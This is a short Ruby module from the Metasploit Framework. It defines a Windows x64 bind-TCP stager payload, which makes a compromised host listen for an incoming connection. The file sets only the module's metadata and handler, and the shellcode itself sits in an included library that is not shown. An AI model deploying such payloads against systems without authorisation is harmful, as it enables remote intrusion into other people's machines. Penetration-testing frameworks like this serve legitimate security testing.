##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/x64/bind_tcp'

module MetasploitModule

  CachedSize = 483

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcp_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Bind TCP Stager',
      'Description'   => 'Listen for a connection (Windows x64)',
      'Author'        => [ 'sf' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockrdi',
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end
end
